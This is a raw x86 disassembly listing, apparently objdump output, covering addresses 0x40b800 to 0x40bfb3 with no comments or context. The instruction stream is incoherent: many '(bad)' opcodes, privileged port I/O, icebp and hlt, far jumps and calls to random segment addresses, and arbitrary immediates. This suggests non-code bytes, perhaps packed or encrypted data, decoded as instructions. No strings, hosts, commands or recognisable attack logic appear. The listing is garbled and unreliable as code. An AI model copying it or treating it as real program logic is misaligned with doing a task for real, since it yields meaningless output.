  40b800:	or     dl,BYTE PTR [esi-0xdadb442]
  40b806:	icebp  
  40b807:	jo     0x40b80d
  40b809:	popa   
  40b80a:	loop   0x40b81d
  40b80c:	sbb    esi,esi
  40b80e:	xchg   edi,eax
  40b80f:	xor    ecx,edi
  40b811:	adc    al,0x45
  40b813:	sahf   
  40b814:	stos   DWORD PTR es:[edi],eax
  40b815:	fs push ss
  40b817:	iret   
  40b818:	adc    al,0xbc
  40b81a:	or     esp,DWORD PTR [edx+0x70]
  40b81d:	mov    ebx,0x2d7890a8
  40b822:	daa    
  40b823:	cli    
  40b824:	inc    ebx
  40b825:	imul   ebp,DWORD PTR [ebp-0x25b161a3],0x3
  40b82c:	ret    0x9a1b
  40b82f:	push   edi
  40b830:	lds    eax,FWORD PTR [ecx]
  40b832:	sub    bh,BYTE PTR [ecx]
  40b834:	sub    eax,0x1e38cd46
  40b839:	xor    DWORD PTR [ecx],ebx
  40b83b:	add    BYTE PTR [ecx+0x39],bh
  40b83e:	out    0x79,al
  40b840:	and    eax,0x297d90ff
  40b845:	shr    ebp,0x81
  40b848:	imul   ebx,DWORD PTR ds:0xac2dbb42,0xffffffbe
  40b84f:	pop    ebp
  40b850:	das    
  40b851:	test   BYTE PTR [edx-0x54],0x55
  40b855:	arpl   sp,bp
  40b857:	test   DWORD PTR [edx-0x4069a265],0x59f30682
  40b861:	cmp    cl,ch
  40b863:	out    0x3b,eax
  40b865:	por    mm6,QWORD PTR [ebp-0x1c]
  40b869:	adc    cl,BYTE PTR [ebx+0x249b2b80]
  40b86f:	faddp  st(5),st
  40b871:	xor    al,0xa1
  40b873:	sbb    eax,0xdc74e6a7
  40b878:	add    BYTE PTR [ebx-0x2c],ah
  40b87b:	test   DWORD PTR [edi-0x499e47c8],eax
  40b881:	lds    ebx,FWORD PTR [edi-0x1128995d]
  40b887:	adc    ebp,DWORD PTR [esi+0x27c804c0]
  40b88d:	in     al,dx
  40b88e:	mov    ebp,0xd6f8c64c
  40b893:	shl    BYTE PTR [esi+edx*1],0xa8
  40b897:	neg    DWORD PTR [edi+edi*2-0x3cbe2fc6]
  40b89e:	popa   
  40b89f:	xchg   esi,eax
  40b8a0:	dec    edx
  40b8a1:	push   esp
  40b8a2:	lods   al,BYTE PTR ds:[esi]
  40b8a3:	cdq    
  40b8a4:	std    
  40b8a5:	sti    
  40b8a6:	rcr    ah,cl
  40b8a8:	aaa    
  40b8a9:	das    
  40b8aa:	push   ebp
  40b8ab:	push   0x15868165
  40b8b0:	popa   
  40b8b1:	pop    es
  40b8b2:	mov    bl,0xa0
  40b8b4:	push   esp
  40b8b5:	addr16 loope 0x40b87b
  40b8b8:	add    dl,BYTE PTR [eax]
  40b8ba:	lahf   
  40b8bb:	vandnps ymm1,ymm5,ymm2
  40b8bf:	pop    esi
  40b8c0:	or     al,0x67
  40b8c2:	pop    edi
  40b8c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8c4:	pop    ebp
  40b8c5:	and    DWORD PTR [edx+0x59b1d5b5],ebp
  40b8cb:	jl     0x40b8fe
  40b8cd:	pop    ebx
  40b8ce:	jns    0x40b8c5
  40b8d0:	jmp    0x4fa744d1
  40b8d5:	sbb    BYTE PTR [edi-0x2d],bl
  40b8d8:	daa    
  40b8d9:	pushf  
  40b8da:	call   0x557f:0x6163eb6c
  40b8e1:	push   esi
  40b8e2:	or     DWORD PTR [ebx+0x61],ebx
  40b8e5:	mov    eax,ds:0xf42d3394
  40b8ea:	scas   eax,DWORD PTR es:[edi]
  40b8eb:	jp     0x40b928
  40b8ed:	xor    al,ch
  40b8ef:	mov    al,0x3
  40b8f1:	inc    edx
  40b8f2:	(bad)  
  40b8f3:	daa    
  40b8f4:	popf   
  40b8f5:	mov    edx,0xab10dda6
  40b8fa:	in     eax,0x56
  40b8fc:	xor    al,bl
  40b8fe:	pop    ecx
  40b8ff:	jge    0x40b92e
  40b901:	addr16 inc edi
  40b903:	pop    ss
  40b904:	jp     0x40b962
  40b906:	mov    ds:0x1769a050,al
  40b90b:	adc    edi,DWORD PTR [ecx-0x873234e]
  40b911:	retf   0x6936
  40b914:	imul   edi,edx,0xffffffdb
  40b917:	in     eax,0xb5
  40b919:	sar    cl,1
  40b91b:	and    bl,BYTE PTR [ebx]
  40b91d:	dec    esp
  40b91e:	add    ebx,edi
  40b920:	mov    eax,ds:0x4693902a
  40b925:	mov    ebp,DWORD PTR [ebx+0x34e2d31a]
  40b92b:	sub    esi,ebx
  40b92d:	jge    0x40b92a
  40b92f:	lea    edx,[edi]
  40b931:	jp     0x40b8f9
  40b933:	cmp    al,0xcf
  40b935:	adc    eax,0x71348103
  40b93a:	sbb    bh,BYTE PTR [edi+0x48e67f7d]
  40b940:	cld    
  40b941:	or     esi,DWORD PTR [ebx+0x365048dc]
  40b947:	mov    dl,0xb5
  40b949:	adc    DWORD PTR [edi],ebp
  40b94b:	sub    cl,bl
  40b94d:	cdq    
  40b94e:	mov    bl,0x8d
  40b950:	push   ss
  40b951:	sbb    BYTE PTR [eax+0x7e],0xd
  40b955:	sub    esi,DWORD PTR ds:0xac6eed61
  40b95b:	jg     0x40b9a5
  40b95d:	xor    eax,0x4614d580
  40b962:	jns    0x40b905
  40b964:	out    dx,eax
  40b965:	jne    0x40b945
  40b967:	or     ch,dl
  40b969:	jl     0x40b95b
  40b96b:	mov    al,ds:0x80f09307
  40b970:	xlat   BYTE PTR ds:[ebx]
  40b971:	outs   dx,DWORD PTR ds:[esi]
  40b972:	pop    es
  40b973:	jecxz  0x40b921
  40b975:	(bad)  
  40b976:	sar    BYTE PTR [edx],1
  40b978:	gs aam 0x66
  40b97b:	mov    bh,0x4f
  40b97d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b97e:	(bad)  
  40b97f:	in     al,0x1d
  40b981:	arpl   si,ax
  40b983:	jb     0x40b935
  40b985:	sub    esp,DWORD PTR [esi]
  40b987:	add    BYTE PTR [ecx],0xba
  40b98a:	dec    ebp
  40b98b:	mov    ds:0x5f1eac0f,eax
  40b990:	pop    esp
  40b991:	shl    BYTE PTR [ebp-0x41590d58],1
  40b997:	imul   edx,DWORD PTR [ebp+0x6a09c04c],0x7737dfe3
  40b9a1:	cdq    
  40b9a2:	fs ret 
  40b9a4:	ja     0x40b938
  40b9a6:	stos   BYTE PTR es:[edi],al
  40b9a7:	jns    0x40b97e
  40b9a9:	mov    ebx,0x77952346
  40b9ae:	sahf   
  40b9af:	dec    ebp
  40b9b0:	in     al,dx
  40b9b1:	inc    esi
  40b9b2:	ins    DWORD PTR es:[edi],dx
  40b9b3:	arpl   WORD PTR [edi+0x2f],di
  40b9b6:	fs scas eax,DWORD PTR es:[edi]
  40b9b8:	xor    di,0xa9c8
  40b9bd:	cdq    
  40b9be:	int3   
  40b9bf:	pushf  
  40b9c0:	dec    eax
  40b9c1:	push   ebp
  40b9c2:	test   BYTE PTR [ebp-0x250b6b62],ah
  40b9c8:	mov    ecx,0x6f11bc81
  40b9cd:	adc    DWORD PTR [ebx+edx*2+0x54],esi
  40b9d1:	fsubr  DWORD PTR [ebx+0x62]
  40b9d4:	pop    ss
  40b9d5:	xor    BYTE PTR [esi],0xbe
  40b9d8:	clc    
  40b9d9:	pusha  
  40b9da:	dec    ebp
  40b9db:	jnp    0x40ba03
  40b9dd:	call   0x247b:0x795588e8
  40b9e4:	cmp    ah,BYTE PTR [ecx]
  40b9e6:	call   0x5e8e:0xeb017ebc
  40b9ed:	push   0x32c22ba2
  40b9f2:	dec    esi
  40b9f3:	cmp    eax,0xb1ae9cd8
  40b9f8:	xor    eax,0xb4b8579f
  40b9fd:	fst    DWORD PTR ds:0x35d2ef51
  40ba03:	mov    ecx,0x638ffc40
  40ba08:	inc    eax
  40ba09:	mov    esi,0x17a66700
  40ba0e:	sub    ah,BYTE PTR [ecx+ecx*8-0x780c857d]
  40ba15:	(bad)  
  40ba17:	hlt    
  40ba18:	push   edx
  40ba19:	xchg   esi,eax
  40ba1a:	mov    ah,0xd8
  40ba1c:	les    eax,FWORD PTR [edx+0x42]
  40ba1f:	mov    ss,WORD PTR [ebx+0x1c3ba053]
  40ba25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba26:	ret    0x1628
  40ba29:	sbb    al,BYTE PTR es:[ebx]
  40ba2c:	xchg   esp,eax
  40ba2d:	cmp    DWORD PTR [eax-0x7152ac5b],0x7d
  40ba34:	mov    BYTE PTR fs:[eax-0x77020a7f],ch
  40ba3b:	or     eax,0xdc38503a
  40ba40:	jl     0x40ba86
  40ba42:	mov    cl,0x9b
  40ba44:	ds push eax
  40ba46:	xchg   ebx,eax
  40ba47:	adc    eax,0x78a52934
  40ba4c:	retf   
  40ba4d:	cli    
  40ba4e:	add    ebp,DWORD PTR [esi+0xe274985]
  40ba54:	mov    gs,WORD PTR ds:0x4089b909
  40ba5a:	pop    esp
  40ba5b:	arpl   WORD PTR [eax],di
  40ba5d:	adc    BYTE PTR [esi-0x53],ch
  40ba60:	xchg   cl,bh
  40ba62:	lock jecxz 0x40babc
  40ba65:	or     eax,0x5c749919
  40ba6a:	sub    al,0xe8
  40ba6c:	repz or al,0x76
  40ba6f:	cmp    ecx,esi
  40ba71:	leave  
  40ba72:	sbb    DWORD PTR [esi-0x7e],0x30449f83
  40ba79:	dec    esp
  40ba7a:	mov    eax,0x4a8fc9e1
  40ba7f:	push   ecx
  40ba80:	inc    edx
  40ba81:	arpl   WORD PTR [ecx+0x59ce029c],si
  40ba87:	sbb    BYTE PTR [ebx+0x5c],ah
  40ba8a:	fcom   QWORD PTR [eax+eiz*4+0x1ddbc221]
  40ba91:	adc    DWORD PTR [ebp-0x7f4166e1],ecx
  40ba97:	into   
  40ba98:	sub    eax,DWORD PTR [ecx+0x1c85892b]
  40ba9e:	rcl    BYTE PTR [edx+0x79007e16],cl
  40baa4:	ins    DWORD PTR es:[edi],dx
  40baa5:	add    bh,dh
  40baa7:	(bad)  
  40baa8:	adc    eax,0xea629af3
  40baad:	inc    ecx
  40baae:	jle    0x40bb0a
  40bab0:	xchg   edi,eax
  40bab1:	cmp    al,0x61
  40bab3:	out    0x84,eax
  40bab5:	imul   ebp,edx,0x85ddb0bf
  40babb:	enter  0xeb16,0xbe
  40babf:	fcomp  DWORD PTR [ecx+0x3c7c6caa]
  40bac5:	add    eax,0xa3b3165
  40baca:	mov    ah,0xde
  40bacc:	je     0x40baeb
  40bace:	cmp    DWORD PTR [ecx-0x54],ecx
  40bad1:	aas    
  40bad2:	xor    al,0x83
  40bad4:	jmp    0xd6c:0xbb99649e
  40badb:	in     eax,dx
  40badc:	mov    WORD PTR [edi-0x2f3e57a7],ds
  40bae2:	xor    cl,BYTE PTR [edi+0x734ad67b]
  40bae8:	fnsave [esi]
  40baea:	fs xor bh,cl
  40baed:	cmpxchg BYTE PTR [edi+0x6d3e19e6],ch
  40baf4:	add    eax,0xe52abd48
  40baf9:	sbb    al,0xb4
  40bafb:	sub    BYTE PTR [edx+esi*4-0x73817965],bh
  40bb02:	mov    esi,0x293dad88
  40bb07:	xchg   ebp,eax
  40bb08:	inc    esp
  40bb09:	call   0xad85517b
  40bb0e:	fcomp  DWORD PTR [ebp+0x42580a47]
  40bb14:	mov    dh,dh
  40bb16:	or     eax,0xafef4b82
  40bb1b:	cs xchg ebx,eax
  40bb1d:	or     eax,0xd31a9ba1
  40bb22:	sbb    al,0xdf
  40bb24:	xor    ah,BYTE PTR [eax-0x161be59]
  40bb2a:	xchg   edi,eax
  40bb2b:	jno    0x40baba
  40bb2d:	mov    ch,0xa1
  40bb2f:	ret    
  40bb30:	and    esi,DWORD PTR [esi-0x15766311]
  40bb36:	imul   esp,DWORD PTR [edx-0x7a],0xffffff88
  40bb3a:	call   0x2df1c850
  40bb3f:	sbb    esi,DWORD PTR [edi]
  40bb41:	(bad)
  40bb45:	dec    edx
  40bb46:	push   ecx
  40bb47:	enter  0x3409,0x6e
  40bb4b:	push   ecx
  40bb4c:	push   ecx
  40bb4d:	jg     0x40bae4
  40bb4f:	scas   eax,DWORD PTR es:[edi]
  40bb50:	xor    al,bl
  40bb52:	fadd   QWORD PTR [ebx]
  40bb54:	test   BYTE PTR [edi-0x22],ch
  40bb57:	sub    BYTE PTR [ebp-0x71],ch
  40bb5a:	jns    0x40bb2f
  40bb5c:	sub    edx,DWORD PTR [ecx+0x27d412d0]
  40bb62:	inc    esp
  40bb63:	fidivr DWORD PTR [ebx+0x6b266834]
  40bb69:	int3   
  40bb6a:	xchg   ebp,eax
  40bb6b:	mov    DWORD PTR [ecx],edi
  40bb6d:	in     al,0xce
  40bb6f:	out    0x83,al
  40bb71:	mov    ds:0xc332e28f,al
  40bb76:	pop    es
  40bb77:	mov    ebx,0x570d211
  40bb7c:	sub    eax,ecx
  40bb7e:	sub    BYTE PTR [ecx+0x7d972b2a],ah
  40bb84:	cld    
  40bb85:	sti    
  40bb86:	jb     0x40bb88
  40bb88:	call   FWORD PTR [ebp-0x65]
  40bb8b:	pusha  
  40bb8c:	cmc    
  40bb8d:	icebp  
  40bb8e:	adc    ch,0xc8
  40bb91:	sbb    al,0x68
  40bb93:	pop    eax
  40bb94:	mov    bh,0x4e
  40bb96:	sbb    eax,edi
  40bb98:	and    DWORD PTR [ebp-0x5c6959ce],esi
  40bb9e:	xchg   esp,eax
  40bb9f:	cld    
  40bba0:	or     BYTE PTR [ebp+0x15],dl
  40bba3:	sub    esi,eax
  40bba5:	shl    BYTE PTR [edx+0xd],cl
  40bba8:	pop    edx
  40bba9:	out    0xb2,al
  40bbab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbac:	aad    0xbd
  40bbae:	popf   
  40bbaf:	pop    ebp
  40bbb0:	mov    eax,edi
  40bbb2:	lods   eax,DWORD PTR ds:[esi]
  40bbb3:	inc    edx
  40bbb4:	call   0xbcb:0x2a56217f
  40bbbb:	mov    edx,0xedbf0808
  40bbc0:	in     al,0x1f
  40bbc2:	or     eax,0x65204d0f
  40bbc7:	(bad)  
  40bbc8:	pop    ds
  40bbc9:	dec    esi
  40bbca:	jge    0x40bbee
  40bbcc:	es das 
  40bbce:	or     BYTE PTR [esi-0x3f],0x3c
  40bbd2:	les    ecx,FWORD PTR [esi-0x7c]
  40bbd5:	sbb    esi,ebp
  40bbd7:	lahf   
  40bbd8:	sub    cl,BYTE PTR [ebp+0x575fa989]
  40bbde:	not    BYTE PTR [ecx-0xc]
  40bbe1:	imul   ebx,DWORD PTR [ebx],0x42
  40bbe4:	and    BYTE PTR [ebp-0x6c],cl
  40bbe7:	pop    es
  40bbe8:	inc    edx
  40bbe9:	scas   al,BYTE PTR es:[edi]
  40bbea:	cld    
  40bbeb:	dec    esp
  40bbec:	dec    edx
  40bbed:	or     bh,BYTE PTR [ecx-0x57]
  40bbf0:	mov    WORD PTR [eax+0x4a],ds
  40bbf3:	mov    dl,0x41
  40bbf5:	and    BYTE PTR [ebx-0x4192f4f8],0xc9
  40bbfc:	xor    bh,BYTE PTR ds:[esi-0x19]
  40bc00:	les    edx,FWORD PTR [esi]
  40bc02:	loope  0x40bc33
  40bc04:	inc    edi
  40bc05:	sar    esi,1
  40bc07:	sbb    eax,0xd7fec9fe
  40bc0c:	retf   0x5384
  40bc0f:	pop    edx
  40bc10:	mov    ecx,0xd1b4ff4f
  40bc15:	jo     0x40bc92
  40bc17:	sbb    DWORD PTR [edi+0x2f4524a4],0xffffffa3
  40bc1e:	mov    eax,0x44b7ba18
  40bc23:	push   es
  40bc24:	mov    al,0x26
  40bc26:	fdivr  QWORD PTR [edi]
  40bc28:	jbe    0x40bbed
  40bc2a:	test   DWORD PTR [edx+0x12],esi
  40bc2d:	ins    DWORD PTR es:[edi],dx
  40bc2e:	mov    cl,0x11
  40bc30:	ret    0x840a
  40bc33:	jmp    0x40bc6d
  40bc35:	arpl   WORD PTR [eax-0x39],cx
  40bc38:	push   0x45e1e531
  40bc3d:	cmp    eax,0xf30098bd
  40bc42:	xchg   esp,eax
  40bc43:	stc    
  40bc44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc45:	ss ins BYTE PTR es:[edi],dx
  40bc47:	mov    WORD PTR [esp+edx*8],?
  40bc4a:	or     esp,DWORD PTR [edi-0x616013b9]
  40bc50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc51:	pop    ds
  40bc52:	pop    ebx
  40bc53:	pop    ebx
  40bc54:	mov    esi,0xe1ac32d5
  40bc59:	jo     0x40bcb7
  40bc5b:	or     esp,ebp
  40bc5d:	xchg   esp,eax
  40bc5e:	sub    al,0x9a
  40bc60:	jl     0x40bc75
  40bc62:	cmc    
  40bc63:	mov    esi,0xb5c1e034
  40bc68:	lahf   
  40bc69:	test   al,0xb9
  40bc6b:	loopne 0x40bbf7
  40bc6d:	and    BYTE PTR [eax],ch
  40bc6f:	sub    al,cl
  40bc71:	das    
  40bc72:	loope  0x40bc64
  40bc74:	mov    edx,0x811e402c
  40bc79:	xor    eax,0x9e8aadd0
  40bc7e:	jb     0x40bcb3
  40bc80:	pop    ebx
  40bc81:	cli    
  40bc82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc83:	dec    ebx
  40bc84:	inc    esp
  40bc85:	xchg   ebx,eax
  40bc86:	cld    
  40bc87:	xchg   esi,eax
  40bc88:	inc    edx
  40bc89:	out    dx,eax
  40bc8a:	aaa    
  40bc8b:	and    DWORD PTR ds:0x835132d,edi
  40bc91:	jl     0x40bc14
  40bc93:	popa   
  40bc94:	arpl   WORD PTR [ebx-0x1f249d68],bx
  40bc9a:	out    dx,eax
  40bc9b:	loopne 0x40bc7f
  40bc9d:	push   0xfffffff0
  40bc9f:	nop
  40bca0:	(bad)  
  40bca1:	das    
  40bca2:	sub    esp,DWORD PTR [edi+0xca35861]
  40bca8:	inc    esi
  40bca9:	push   ds
  40bcaa:	and    BYTE PTR [ebx-0x60001d9b],bh
  40bcb0:	cdq    
  40bcb1:	mov    ds:0xe318392f,al
  40bcb6:	add    al,ch
  40bcb8:	arpl   WORD PTR [ebx+0x39],bp
  40bcbb:	js     0x40bcd7
  40bcbd:	retf   0xea38
  40bcc0:	test   al,0x28
  40bcc2:	cmp    al,0x3
  40bcc4:	mov    dl,0x92
  40bcc6:	sahf   
  40bcc7:	inc    edx
  40bcc8:	cmp    ebp,DWORD PTR [eax+0x1d]
  40bccb:	jo     0x40bd32
  40bccd:	xchg   ecx,eax
  40bcce:	jp     0x40bc8f
  40bcd0:	push   esp
  40bcd1:	mov    edx,0x36da4fc2
  40bcd6:	(bad)  
  40bcd7:	jo     0x40bc94
  40bcd9:	push   esi
  40bcda:	cmp    BYTE PTR [eax-0x55],ch
  40bcdd:	dec    DWORD PTR [ebx]
  40bcdf:	jmp    0xc85f:0x904b047f
  40bce6:	mov    ds:0x154de02f,al
  40bceb:	ds ret 
  40bced:	and    eax,0x54366580
  40bcf2:	jne    0x40bd43
  40bcf4:	in     eax,0x55
  40bcf6:	jle    0x40bd14
  40bcf8:	mov    esp,0xa6c3e52c
  40bcfd:	out    dx,eax
  40bcfe:	scas   al,BYTE PTR es:[edi]
  40bcff:	ss inc esp
  40bd01:	adc    DWORD PTR [ecx],edx
  40bd03:	push   eax
  40bd04:	xacquire lock sub BYTE PTR [esi+0x4d2f6fd5],al
  40bd0c:	xchg   edx,eax
  40bd0d:	push   ebp
  40bd0e:	(bad)
  40bd11:	leave  
  40bd12:	xor    ah,BYTE PTR [esi+0x2d26cb62]
  40bd18:	call   0x91e8cb95
  40bd1d:	add    dh,ah
  40bd1f:	sub    esp,DWORD PTR [edi]
  40bd21:	jg     0x40bd59
  40bd23:	inc    edi
  40bd24:	cmc    
  40bd25:	bound  ebx,QWORD PTR ds:0x64f0fa4c
  40bd2b:	clc    
  40bd2c:	jmp    0x40bcef
  40bd2e:	xor    BYTE PTR [ebp+0x4a6cbb5c],bh
  40bd34:	sti    
  40bd35:	mov    eax,ds:0x334e15e3
  40bd3a:	nop
  40bd3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd3c:	fwait
  40bd3d:	mov    dl,BYTE PTR [ebx-0x5b]
  40bd40:	retf   
  40bd41:	hlt    
  40bd42:	int    0x8a
  40bd44:	int    0x45
  40bd46:	sbb    cl,bl
  40bd48:	dec    ebp
  40bd49:	push   ds
  40bd4a:	test   al,0x2e
  40bd4c:	xchg   bh,ah
  40bd4e:	pop    ds
  40bd4f:	into   
  40bd50:	out    dx,eax
  40bd51:	or     al,0xf9
  40bd53:	scas   eax,DWORD PTR es:[edi]
  40bd54:	loope  0x40bd6c
  40bd56:	xlat   BYTE PTR ds:[ebx]
  40bd57:	jecxz  0x40bd96
  40bd59:	pop    ecx
  40bd5a:	ins    BYTE PTR es:[edi],dx
  40bd5b:	cli    
  40bd5c:	mov    ds:0xb3efb38b,eax
  40bd61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd62:	mov    edi,0x4afc9ada
  40bd67:	mov    bl,0x47
  40bd69:	xchg   edi,eax
  40bd6a:	jns    0x40bd6d
  40bd6c:	jmp    0x6d99:0xfb2c9bf9
  40bd73:	mov    eax,DWORD PTR [ebp+0x36]
  40bd76:	xchg   esi,eax
  40bd77:	adc    DWORD PTR [ebx-0x528176e2],0xfbb2e63e
  40bd81:	mov    ds:0xd2c0bdeb,eax
  40bd86:	xor    DWORD PTR [ebx-0x2381a9bf],ebx
  40bd8c:	icebp  
  40bd8d:	mov    eax,0xb896ee6f
  40bd92:	scas   eax,DWORD PTR es:[edi]
  40bd93:	popa   
  40bd94:	adc    DWORD PTR [ebp+ecx*2-0x62],ebp
  40bd98:	push   ecx
  40bd99:	sbb    dl,BYTE PTR [ecx-0x655adf73]
  40bd9f:	retf   0x2e59
  40bda2:	in     al,0x9f
  40bda4:	adc    eax,0xe326b3a
  40bda9:	push   ds
  40bdaa:	cli    
  40bdab:	(bad)  
  40bdac:	ret    0x977
  40bdaf:	jp     0x40bd53
  40bdb1:	jne    0x40bd8f
  40bdb3:	and    DWORD PTR [edi],edx
  40bdb5:	arpl   si,si
  40bdb7:	(bad)  [ebp+0x1]
  40bdba:	xlat   BYTE PTR ds:[ebx]
  40bdbc:	mov    edi,0x2bb4aa34
  40bdc1:	in     al,0xce
  40bdc3:	mov    dh,0x6d
  40bdc5:	das    
  40bdc6:	add    BYTE PTR [esi-0x5f],cl
  40bdc9:	add    eax,0x8749de43
  40bdce:	popa   
  40bdcf:	shl    BYTE PTR [ebx+0x2d3cfee8],cl
  40bdd5:	push   ecx
  40bdd6:	das    
  40bdd7:	jp     0x40bd7e
  40bdd9:	loope  0x40be41
  40bddb:	sub    eax,0x4cc33aea
  40bde0:	push   esp
  40bde1:	lock and edi,DWORD PTR [ebp+0x2aa3b016]
  40bde8:	or     ax,WORD PTR [ecx+0x5c6191a4]
  40bdef:	adc    ebx,DWORD PTR [ecx-0x707333d2]
  40bdf5:	int    0x92
  40bdf7:	and    al,0x94
  40bdf9:	out    dx,al
  40bdfa:	retf   0x5d4b
  40bdfd:	lods   eax,DWORD PTR ds:[esi]
  40bdfe:	imul   ebx,DWORD PTR [ebp-0x7ce7322b],0x4bf31442
  40be08:	jno    0x40be28
  40be0a:	in     eax,dx
  40be0b:	aaa    
  40be0c:	inc    BYTE PTR [ebx]
  40be0e:	add    eax,0xfedff1ca
  40be13:	test   dh,cl
  40be15:	xchg   edi,eax
  40be16:	call   0x337be983
  40be1b:	ss loope 0x40be4f
  40be1e:	push   ss
  40be1f:	out    dx,al
  40be20:	mov    edx,0xbec1b4df
  40be25:	xchg   edi,eax
  40be26:	add    bl,bh
  40be28:	pop    edi
  40be29:	sbb    al,0x37
  40be2b:	aaa    
  40be2c:	sub    DWORD PTR [ebx-0x646c46ff],ecx
  40be32:	icebp  
  40be33:	sahf   
  40be34:	jno    0x40beac
  40be36:	mov    edi,0xc366ff5e
  40be3b:	mov    dh,0x7e
  40be3d:	jno    0x40be45
  40be3f:	push   0x39
  40be41:	mov    dh,0xd2
  40be43:	pop    edi
  40be44:	hlt    
  40be45:	test   DWORD PTR [ebx],ebx
  40be47:	ds (bad) 
  40be49:	lea    ebx,[esi+0x8]
  40be4c:	loopne 0x40bebf
  40be4e:	xor    BYTE PTR [ebx],dl
  40be50:	dec    eax
  40be51:	cmp    bh,BYTE PTR [ebp+0x7c]
  40be54:	inc    ecx
  40be55:	push   ecx
  40be56:	stos   DWORD PTR es:[edi],eax
  40be57:	cmp    DWORD PTR [ecx+0x2ef7fa65],0xcb1f3a53
  40be61:	popa   
  40be62:	popf   
  40be63:	out    0x77,al
  40be65:	mov    ds:0x1d6a8a21,al
  40be6a:	cmp    DWORD PTR [eax],0xad85dd74
  40be70:	push   eax
  40be71:	adc    al,0x42
  40be73:	xchg   DWORD PTR [ebp-0x5],ecx
  40be76:	jns    0x40be52
  40be78:	jg     0x40bec9
  40be7a:	mov    ebp,0x1f333f00
  40be7f:	jmp    0xb4fe0443
  40be84:	cmp    BYTE PTR [edi+edx*1-0x14],dl
  40be88:	pushf  
  40be89:	stc    
  40be8a:	leave  
  40be8b:	bound  ebx,QWORD PTR [ecx+0x42]
  40be8e:	retf   
  40be8f:	xor    DWORD PTR [edi+0x17],ebp
  40be92:	stos   BYTE PTR es:[edi],al
  40be93:	(bad)  
  40be94:	iret   
  40be95:	fcomi  st,st(4)
  40be97:	call   0x85b321af
  40be9c:	out    0x2d,al
  40be9e:	jmp    0xb3538247
  40bea3:	or     bl,BYTE PTR [edi+0x3ed5b791]
  40bea9:	hlt    
  40beaa:	not    DWORD PTR [edi+0x7f]
  40bead:	mov    ebp,0x91577ff4
  40beb2:	mov    al,0x1a
  40beb4:	adc    BYTE PTR [edi+0x5f],dl
  40beb7:	mov    ds:0x520d0478,eax
  40bebc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bebd:	jo     0x40bed6
  40bebf:	dec    ecx
  40bec1:	sbb    bl,BYTE PTR [edx+ebp*1-0x13b8f43]
  40bec8:	int    0x8c
  40beca:	jnp    0x40bef8
  40becc:	fidiv  WORD PTR [edx]
  40bece:	dec    eax
  40bed0:	xchg   ebp,eax
  40bed1:	fisttp QWORD PTR [eax-0x61]
  40bed4:	dec    esi
  40bed5:	and    edi,DWORD PTR [eax+0xf]
  40bed8:	call   0xc059:0x9000f926
  40bedf:	adc    ebx,DWORD PTR [esi+0x63]
  40bee2:	sbb    DWORD PTR [esi],edi
  40bee4:	push   0xcdca7781
  40bee9:	xor    eax,0xbb499e9b
  40beee:	pusha  
  40beef:	adc    al,0x94
  40bef1:	mov    bh,0xad
  40bef3:	mov    dl,0xaa
  40bef5:	or     ebx,DWORD PTR [ebp-0x64]
  40bef8:	data16 jb 0x40bef0
  40befb:	stc    
  40befc:	pop    ds
  40befd:	arpl   WORD PTR [eax-0x3c],bx
  40bf00:	sub    BYTE PTR [esi-0x26cdf003],dh
  40bf06:	mov    dl,0xf1
  40bf08:	mov    al,0x4b
  40bf0a:	retf   
  40bf0b:	sbb    dl,ch
  40bf0d:	addr16 popa 
  40bf0f:	mov    edi,0x94c04232
  40bf14:	out    0x46,al
  40bf16:	ret    
  40bf17:	bound  ebx,QWORD PTR [edx+edx*1-0x43]
  40bf1b:	call   FWORD PTR [ebx]
  40bf1d:	push   esp
  40bf1e:	(bad)  
  40bf1f:	adc    BYTE PTR [edi],dl
  40bf21:	push   esi
  40bf22:	cmp    eax,0xd709b8e5
  40bf27:	inc    edx
  40bf28:	nop    DWORD PTR [ebp+edx*2-0x4d]
  40bf2d:	enter  0x6fd2,0x21
  40bf31:	aad    0x4
  40bf33:	daa    
  40bf34:	mov    ch,0x93
  40bf36:	aad    0x7b
  40bf38:	dec    ebp
  40bf39:	push   esp
  40bf3a:	mov    ebp,0x9a3a9a92
  40bf3f:	push   es
  40bf40:	or     eax,0x8b5dab25
  40bf45:	xchg   edi,eax
  40bf46:	mov    cs:0x7d860791,eax
  40bf4c:	add    ebx,ecx
  40bf4e:	push   eax
  40bf4f:	jae    0x40bee5
  40bf51:	clc    
  40bf52:	fcom   QWORD PTR [ebp+0x4a3d8701]
  40bf58:	cmc    
  40bf59:	stc    
  40bf5a:	xchg   cl,bh
  40bf5c:	push   0x1879afb7
  40bf61:	ficom  DWORD PTR [eax+0x3d72506]
  40bf67:	push   eax
  40bf68:	jno    0x40bf88
  40bf6a:	sti    
  40bf6b:	pop    esi
  40bf6c:	dec    edi
  40bf6d:	push   es
  40bf6e:	shr    ebp,1
  40bf70:	daa    
  40bf71:	sub    BYTE PTR [esi+esi*1+0x49],bh
  40bf75:	je     0x40bf27
  40bf77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf78:	aaa    
  40bf79:	dec    edi
  40bf7a:	mov    bl,0x92
  40bf7c:	mov    dh,BYTE PTR [esi-0x34cebee1]
  40bf82:	lock xor dh,BYTE PTR [ebx-0x7b]
  40bf86:	and    bh,BYTE PTR fs:[ebx+0x3d]
  40bf8a:	ret    
  40bf8b:	sub    eax,0xa310775d
  40bf90:	mov    bl,0x86
  40bf92:	fmul   st(5),st
  40bf94:	sbb    dl,BYTE PTR [esi+0x48fb1a67]
  40bf9a:	test   DWORD PTR [edi-0x68],ebx
  40bf9d:	iret   
  40bf9e:	outs   dx,BYTE PTR ds:[esi]
  40bf9f:	ret    0xf0d6
  40bfa2:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40bfa4:	or     eax,0xc05b06d1
  40bfa9:	pop    edi
  40bfaa:	push   esp
  40bfab:	rcl    BYTE PTR [ebx+0x5d252f],1
  40bfb1:	dec    ebx
  40bfb2:	hlt    
  40bfb3:	inc    edi
